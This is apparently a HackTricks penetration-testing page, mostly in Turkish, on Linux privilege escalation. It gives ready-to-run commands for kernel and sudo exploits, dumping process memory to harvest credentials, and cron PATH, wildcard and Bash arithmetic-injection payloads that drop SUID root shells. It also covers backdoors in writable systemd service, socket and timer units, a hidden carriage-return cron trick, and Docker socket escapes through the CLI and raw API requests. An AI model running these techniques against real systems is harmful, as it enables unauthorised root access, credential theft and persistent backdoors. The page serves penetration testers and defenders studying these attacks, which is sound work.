# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Sistem Bilgileri

### OS bilgisi

Çalışan OS hakkında bazı bilgiler edinelim.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Eğer **`PATH` değişkenindeki herhangi bir klasöre yazma izniniz** varsa bazı libraries veya binaries'leri hijack edebilirsiniz:
```bash
echo $PATH
```
### Env bilgisi

Env değişkenlerinde ilginç bilgiler, şifreler veya API anahtarları var mı?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kernel sürümünü kontrol edin ve escalate privileges için kullanılabilecek bir exploit olup olmadığını araştırın.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
İyi bir zafiyetli kernel listesi ve bazı zaten **compiled exploits**'i şurada bulabilirsiniz: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) ve [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Bazı **compiled exploits** bulabileceğiniz diğer siteler: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

O web sitesinden tüm zafiyetli kernel versiyonlarını çıkarmak için şunu yapabilirsiniz:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Kernel exploits aramak için yardımcı olabilecek araçlar şunlardır:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (hedefte çalıştırın, yalnızca kernel 2.x için exploit'leri kontrol eder)

Her zaman **kernel sürümünü Google'da arayın**, belki kernel sürümünüz bazı kernel exploit'lerinde yazılıdır ve böylece bu exploit'in geçerli olduğundan emin olursunuz.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo sürümü

Aşağıda görünen zafiyetli sudo sürümlerine dayanarak:
```bash
searchsploit sudo
```
Bu grep'i kullanarak sudo sürümünün zafiyetli olup olmadığını kontrol edebilirsiniz.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Kaynak: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg imza doğrulaması başarısız

Bu vuln'ün nasıl sömürülebileceğine dair bir **örnek** için **smasher2 box of HTB**'ye bakın
```bash
dmesg 2>/dev/null | grep "signature"
```
### Daha fazla sistem keşfi
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Olası savunmaları listele

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Eğer bir docker container içindeyseniz, ondan kaçmayı deneyebilirsiniz:


{{#ref}}
docker-security/
{{#endref}}

## Sürücüler

Hangi şeylerin **what is mounted and unmounted** olduğunu, nerede ve nedenini kontrol edin. Eğer herhangi bir şey unmounted ise, onu mount etmeyi deneyebilir ve özel bilgileri kontrol edebilirsiniz
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Faydalı yazılımlar

Kullanışlı ikili dosyaları listeleyin
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Ayrıca, **herhangi bir derleyicinin yüklü olup olmadığını** kontrol edin. Bu, bazı kernel exploit'lerini kullanmanız gerekirse faydalıdır; çünkü bunu kullanacağınız makinede (veya benzer bir makinede) derlemeniz önerilir.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Yüklü Zafiyetli Yazılımlar

Yüklü paketlerin ve servislerin **sürümünü** kontrol edin. Belki eski bir Nagios sürümü (örneğin) vardır ve bu, escalating privileges için istismar edilebilir…\
Daha şüpheli görünen yüklü yazılımların sürümlerini manuel olarak kontrol etmeniz önerilir.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _Bu komutların çoğunlukla işe yaramayan çok fazla bilgi göstereceğini unutmayın; bu nedenle, kurulu yazılım sürümlerinin bilinen exploitslere karşı zafiyetli olup olmadığını kontrol edecek OpenVAS veya benzeri uygulamaların kullanılması önerilir_

## Processes

Çalıştırılan **hangi süreçlerin** olduğunu inceleyin ve herhangi bir sürecin **olması gerekenden daha fazla ayrıcalığa sahip olup olmadığını** kontrol edin (örneğin tomcat'ın root tarafından çalıştırılması mı?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Ayrıca işlem ikili dosyaları üzerindeki ayrıcalıklarınızı kontrol edin; belki birinin üzerine yazabilirsiniz.

### İşlem izleme

İşlemleri izlemek için [**pspy**](https://github.com/DominicBreuker/pspy) gibi araçları kullanabilirsiniz. Bu, sık çalıştırılan veya belirli gereksinimler karşılandığında yürütülen zafiyetli işlemleri tespit etmek için çok faydalı olabilir.

### İşlem belleği

Bazı sunucu servisleri **kimlik bilgilerini belleğin içinde açık metin olarak saklar**.\
Normalde diğer kullanıcılara ait işlemlerin belleğini okumak için **root ayrıcalıkları** gerekir; bu yüzden bu genellikle zaten root olduğunuzda daha fazla kimlik bilgisi keşfetmek için daha faydalıdır.\
Ancak, unutmayın ki **normal bir kullanıcı olarak sahip olduğunuz işlemlerin belleğini okuyabilirsiniz**.

> [!WARNING]
> Günümüzde çoğu makine **varsayılan olarak ptrace'e izin vermez**, bu da yetkisiz kullanıcınıza ait diğer işlemlerin dökümünü alamayacağınız anlamına gelir.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: tüm işlemler, aynı uid'ye sahip oldukları sürece debuglanabilir. Bu, ptrace'in klasik çalışma şeklidir.
> - **kernel.yama.ptrace_scope = 1**: sadece bir ebeveyn işlem debuglanabilir.
> - **kernel.yama.ptrace_scope = 2**: Sadece admin ptrace kullanabilir; bunun için CAP_SYS_PTRACE yetkisi gerekir.
> - **kernel.yama.ptrace_scope = 3**: Hiçbir işlem ptrace ile izlenemez. Bir kere ayarlandığında ptrace'i yeniden etkinleştirmek için yeniden başlatma gerekir.

#### GDB

Örneğin bir FTP servisine ait belleğe erişiminiz varsa Heap'i elde edip içindeki kimlik bilgilerini arayabilirsiniz.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Belirli bir process ID için, **maps bu sürecin sanal adres alanı içinde belleğin nasıl eşlendiğini gösterir**; ayrıca **her eşlenen bölgenin permissions**'ını gösterir. **mem** pseudo dosyası **işlemin belleğinin kendisini açığa çıkarır**. **maps** dosyasından hangi **bellek bölgelerinin okunabilir** olduğunu ve offsetlerini biliriz. Bu bilgiyi **mem dosyasında seek yapıp tüm okunabilir bölgeleri dump etmek** için kullanırız.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem`, sistemin **fiziksel** belleğine erişim sağlar, sanal belleğe değil. Kernel'in sanal adres alanına /dev/kmem üzerinden erişilebilir.\
Genellikle, `/dev/mem` yalnızca **root** ve **kmem** grubu tarafından okunabilir.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump için linux

ProcDump, Windows için Sysinternals araç paketindeki klasik ProcDump aracının linux için yeniden tasarlanmış halidir. Şuradan edinebilirsiniz: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Araçlar

Bir işlemin belleğini dökmek için şu araçları kullanabilirsiniz:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Kök gereksinimlerini manuel olarak kaldırabilir ve size ait olan işlemi dökebilirsiniz
- Script A.5 şu adresten: [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root gereklidir)

### İşlem Belleğinden Kimlik Bilgileri

#### Manuel örnek

Eğer authenticator işlemi çalışıyorsa:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Process'i dump edebilirsiniz (önceki bölümlere bakın; bir sürecin memory'sini dump etmenin farklı yolları anlatılıyor) ve memory içinde credentials arayın:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Araç [**https://github.com/huntergregal/mimipenguin**] bellekten **açık metin kimlik bilgilerini** ve bazı **iyi bilinen dosyalardan** çalar. Doğru çalışması için root ayrıcalıkları gerektirir.

| Özellik                                           | İşlem Adı            |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Arama Regexleri/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zamanlanmış/Cron işleri

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Eğer bir web “Crontab UI” paneli (alseambusher/crontab-ui) root olarak çalışıyor ve yalnızca loopback'e bağlıysa, yine de SSH local port-forwarding ile ona erişebilir ve yükselmek için ayrıcalıklı bir job oluşturabilirsiniz.

Tipik zincir
- Sadece loopback'e açık portu keşfet (ör., 127.0.0.1:8000) ve Basic-Auth realm'ini `ss -ntlp` / `curl -v localhost:8000` ile tespit et
- Kimlik bilgilerini operasyonel artefaktlarda bul:
  - Yedekler/scriptler (`zip -P <password>`)
  - systemd unit'ında `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` gibi değerler bulunabilir
- Tünelleme ve giriş:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- High-priv job oluşturun ve hemen çalıştırın (SUID shell bırakır):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Kullan:
```bash
/tmp/rootshell -p   # root shell
```
Güçlendirme
- Crontab UI'yi root olarak çalıştırmayın; dedicated user ve minimal permissions ile sınırlandırın
- localhost'a bind edin ve ayrıca erişimi firewall/VPN ile kısıtlayın; şifreleri tekrar kullanmayın
- Unit dosyalarına secrets gömmekten kaçının; secret store'lar veya root-only EnvironmentFile kullanın
- on-demand job executions için audit/logging etkinleştirin

Herhangi bir scheduled job'ın vulnerable olup olmadığını kontrol edin. Belki root tarafından çalıştırılan bir script'ten faydalanabilirsiniz (wildcard vuln? root'un kullandığı dosyaları değiştirebilir misiniz? symlinks kullanmak? root'un kullandığı dizinde belirli dosyalar oluşturmak?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Örneğin, _/etc/crontab_ içinde PATH'i şu şekilde bulabilirsiniz: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Kullanıcı "user"ın /home/user üzerinde yazma ayrıcalıklarına sahip olduğuna dikkat edin_)

Eğer bu crontab içinde root kullanıcısı PATH ayarlamadan bir komut veya script çalıştırmaya çalışırsa. Örneğin: _\* \* \* \* root overwrite.sh_\

Bu durumda, aşağıdakini kullanarak root shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Joker karakter içeren bir script kullanan Cron (Wildcard Injection)

Bir script root tarafından çalıştırılıyor ve bir komut içinde “**\***” varsa, bunu beklenmeyen şeyler (ör. privesc) yapmak için exploit edebilirsiniz. Örnek:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Eğer wildcard bir yolun önünde bulunuyorsa, örneğin** _**/some/path/\***_ **, bu açık değildir (hatta** _**./\***_ **da değildir).**

Daha fazla wildcard exploitation tricks için aşağıdaki sayfayı okuyun:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash, ((...)), $((...)) ve let içinde aritmetik değerlendirmeden önce parametre genişletmesi ve komut ikamesi uygular. Eğer root olarak çalışan bir cron/parser güvensiz log alanlarını okur ve bunları aritmetik bağlama beslerse, bir saldırgan cron çalıştığında root olarak çalışacak bir komut ikamesi $(...) enjekte edebilir.

- Neden çalışır: Bash'te genişletmeler şu sırayla gerçekleşir: parametre/değişken genişletmesi, komut ikamesi, aritmetik genişletme, sonra word splitting ve pathname expansion. Bu yüzden `$(/bin/bash -c 'id > /tmp/pwn')0` gibi bir değer önce ikame edilir (komut çalışır), sonra kalan sayısal `0` aritmetikte kullanılır ve script hatasız devam eder.

- Tipik savunmasız örnek:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- İstismar: Ayrıştırılan log'a saldırgan tarafından kontrol edilen metin yazdırın, böylece sayısal görünümlü alan bir komut ikamesi içerir ve bir rakamla biter. Komutunuzun stdout'a yazmadığından emin olun (ya da yönlendirin) ki aritmetik geçerli kalsın.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Eğer root tarafından çalıştırılan bir cron betiğini **değiştirebiliyorsanız**, çok kolay bir şekilde shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Eğer root tarafından çalıştırılan script **tam erişiminizin olduğu bir dizin** kullanıyorsa, o klasörü silip sizin kontrolünüzde bir script sunan başka bir dizine **symlink klasörü oluşturmak** faydalı olabilir.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Sık cron jobs

Süreçleri izleyerek her 1, 2 veya 5 dakikada bir çalıştırılan process'leri tespit edebilirsiniz. Belki bundan faydalanıp privilege escalation gerçekleştirebilirsiniz.

Örneğin, **1 dakika boyunca her 0.1s'de izlemek**, **daha az çalıştırılan komutlara göre sırala** ve en çok çalıştırılan komutları silmek için şunu yapabilirsiniz:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ayrıca kullanabilirsiniz** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (bu, başlayan her süreci izleyecek ve listeleyecektir).

### Görünmez cron jobs

Bir cronjob oluşturmak mümkündür: bir yorumdan sonra **putting a carriage return after a comment** (yeni satır karakteri olmadan) koyarsanız cron job çalışır. Örnek (carriage return char'ına dikkat):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servisler

### Yazılabilir _.service_ dosyaları

Herhangi bir `.service` dosyasına yazıp yazamayacağınızı kontrol edin, yazabiliyorsanız, bunu **değiştirip** servisin **başlatıldığında**, **yeniden başlatıldığında** veya **durdurulduğunda** sizin **backdoor**'unuzun **çalıştırılmasını** sağlayabilirsiniz (muhtemelen makinenin yeniden başlatılmasını beklemeniz gerekebilir).\
Örneğin .service dosyasının içine backdoor'unuzu şu şekilde oluşturun: **`ExecStart=/tmp/script.sh`**

### Yazılabilir servis ikili dosyaları

Unutmayın ki eğer **servisler tarafından çalıştırılan ikili dosyalar üzerinde yazma iznine** sahipseniz, bunları backdoor'lar için değiştirebilirsiniz; böylece servisler tekrar çalıştırıldığında backdoor'lar da çalıştırılacaktır.

### systemd PATH - Göreli Yollar

**systemd** tarafından kullanılan PATH'i şu komutla görebilirsiniz:
```bash
systemctl show-environment
```
Eğer yolun herhangi bir klasörüne **write** yazabiliyorsanız, **escalate privileges** mümkün olabilir. Servis yapılandırma dosyalarında kullanılan **göreli yolları** şu tür dosyalarda aramalısınız:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Daha sonra, yazma izniniz olan systemd PATH klasörü içine, göreli yol binary'siyle aynı ada sahip bir **executable** oluşturun; servis zafiyetli eylemi (**Start**, **Stop**, **Reload**) gerçekleştirmesi istendiğinde, sizin **backdoor**'unuz çalıştırılacaktır (yetkisiz kullanıcılar genellikle servisleri start/stop yapamazlar ama `sudo -l` kullanıp kullanamadığınızı kontrol edin).

**Servisler hakkında daha fazla bilgi için `man systemd.service` komutunu kullanın.**

## **Zamanlayıcılar**

**Zamanlayıcılar** systemd unit dosyalarıdır; adları `**.timer**` ile biten ve `**.service**` dosyalarını veya olayları kontrol eden birimlerdir. **Zamanlayıcılar**, takvim zamanlı olaylar ve monotonik zaman olayları için yerleşik destek sundukları ve eşzamansız çalıştırılabildikleri için cron'a bir alternatif olarak kullanılabilir.

Tüm zamanlayıcıları şu komutla listeleyebilirsiniz:
```bash
systemctl list-timers --all
```
### Yazılabilir zamanlayıcılar

Eğer bir zamanlayıcıyı değiştirebiliyorsanız, systemd.unit içindeki mevcut bazı birimleri (ör. `.service` veya `.target`) çalıştırmasını sağlayabilirsiniz.
```bash
Unit=backdoor.service
```
Dokümantasyonda Unit'in ne olduğu şu şekilde açıklanmış:

> Bu timer sona erdiğinde etkinleştirilecek unit. Argüman, son eki ".timer" olmayan bir unit adıdır. Belirtilmemişse, bu değer timer unit ile aynı adı taşıyan, sadece son eki farklı olan bir service olarak varsayılan olur. (Yukarıya bakın.) Etkinleştirilen unit adı ile timer unit adının, son ek hariç, aynı isimde olması önerilir.

Bu izni kötüye kullanmak için şunları yapmanız gerekir:

- Bir systemd unit (ör. `.service`) bulun; bu unit **yazılabilir bir binary çalıştırıyor**
- Bir systemd unit bulun; bu unit **göreli bir yol çalıştırıyor** ve siz **systemd PATH** üzerinde **yazma ayrıcalıklarına** sahipsiniz (o executable'ı taklit etmek için)

**Zamanlayıcılar hakkında daha fazla bilgi için `man systemd.timer` komutunu kullanın.**

### **Timer'ı Etkinleştirme**

Bir timer'ı etkinleştirmek için root ayrıcalıklarına sahip olmanız ve şu komutu çalıştırmanız gerekir:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS), istemci-sunucu modellerinde aynı veya farklı makinelerde **process communication** sağlar. Bilgisayarlar arası iletişim için standart Unix descriptor dosyalarını kullanır ve `.socket` dosyaları aracılığıyla yapılandırılırlar.

Sockets `.socket` dosyaları kullanılarak yapılandırılabilir.

**Daha fazla bilgi için sockets hakkında `man systemd.socket`'a bakın.** Bu dosyanın içinde, yapılandırılabilecek birkaç ilginç parametre vardır:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Bu seçenekler farklıdır fakat özetle socket'in nerede dinleyeceğini **belirtmek** için kullanılır (AF_UNIX socket dosyasının yolu, dinlenecek IPv4/6 ve/veya port numarası vb.)
- `Accept`: boolean bir argüman alır. Eğer **true** ise, her gelen bağlantı için bir servis örneği oluşturulur ve yalnızca bağlantı socket'i ona geçirilir. Eğer **false** ise, tüm listening socket'ler başlatılan service birimine **geçirilir**, ve tüm bağlantılar için sadece bir service birimi oluşturulur. Bu değer datagram sockets ve FIFOs için göz ardı edilir; bu türlerde tek bir service birimi tüm gelen trafiği koşulsuz olarak ele alır. Varsayılan olarak false'tur. Performans nedenleriyle yeni daemon'ların `Accept=no` için uygun şekilde yazılması önerilir.
- `ExecStartPre`, `ExecStartPost`: Bir veya daha fazla komut satırı alır; bunlar sırasıyla listening **sockets**/FIFOs **oluşturulmadan** ve bağlanmadan **önce** veya **sonra** çalıştırılır. Komut satırının ilk token'ı mutlak bir dosya adı olmalıdır, ardından işlem için argümanlar gelir.
- `ExecStopPre`, `ExecStopPost`: Listening **sockets**/FIFOs **kapatılmadan** ve kaldırılmadan önce veya sonra **çalıştırılan** ek **komutlar**dır.
- `Service`: Gelen trafik üzerine hangi **service** unit adının **aktif edileceğini** belirtir. Bu ayar yalnızca Accept=no olan sockets için izinlidir. Varsayılan olarak socket ile aynı adı taşıyan service'e işaret eder (uzantısı değiştirilmiş olarak). Çoğu durumda bu seçeneği kullanmaya gerek yoktur.

### Yazılabilir .socket files

Eğer bir **writable** `.socket` dosyası bulursanız, `[Socket]` bölümünün başına `ExecStartPre=/home/kali/sys/backdoor` gibi bir satır **ekleyebilirsiniz** ve backdoor socket oluşturulmadan önce çalıştırılacaktır. Bu yüzden **muhtemelen makinenin yeniden başlatılmasını beklemeniz gerekecektir.**\
_Sistemin o socket dosyası yapılandırmasını kullanıyor olması gerekir; yoksa backdoor çalıştırılmaz_

### Yazılabilir sockets

Eğer herhangi bir **writable socket** tespit ederseniz (_şimdi config `.socket` dosyalarından değil, Unix Sockets'dan bahsediyoruz_), o socket ile **iletişim kurabilir** ve belki bir zafiyeti istismar edebilirsiniz.

### Unix Sockets'i Listeleme
```bash
netstat -a -p --unix
```
### Ham bağlantı
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**İstismar örneği:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

HTTP isteklerini dinleyen bazı **sockets** olabilir (_.socket dosyalarından değil, unix sockets gibi davranan dosyalardan bahsediyorum_). Bunu şu komutla kontrol edebilirsiniz:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
If the socket **responds with an HTTP** request ise, onunla **communicate** edebilir ve belki bazı **exploit some vulnerability** gerçekleştirebilirsiniz.

### Yazılabilir Docker Socket

Docker socket, genellikle `/var/run/docker.sock` konumunda bulunur ve korunması gereken kritik bir dosyadır. Varsayılan olarak, `root` kullanıcı ve `docker` grubunun üyeleri tarafından yazılabilir. Bu socket'e sahip olmak (possessing write access to this socket) privilege escalation'a yol açabilir. Aşağıda bunun nasıl yapılabileceğinin ve Docker CLI mevcut değilse alternatif yöntemlerin bir dökümü bulunmaktadır.

#### **Privilege Escalation with Docker CLI**

Docker socket'e write access'iniz varsa, aşağıdaki komutları kullanarak privileges'i escalate edebilirsiniz:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
These commands allow you to run a container with root-level access to the host's file system.

#### **Docker API'sini Doğrudan Kullanma**

In cases where the Docker CLI isn't available, the Docker socket can still be manipulated using the Docker API and `curl` commands.

1.  **List Docker Images:** Retrieve the list of available images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Send a request to create a container that mounts the host system's root directory.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Use `socat` to establish a connection to the container, enabling command execution within it.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

After setting up the `socat` connection, you can execute commands directly in the container with root-level access to the host's filesystem.

### Diğerleri

Note that if you have write permissions over the docker socket because you are **inside the group `docker`** you have [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). If the [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Check **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) ayrıcalık yükseltme

If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** ayrıcalık yükseltme

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

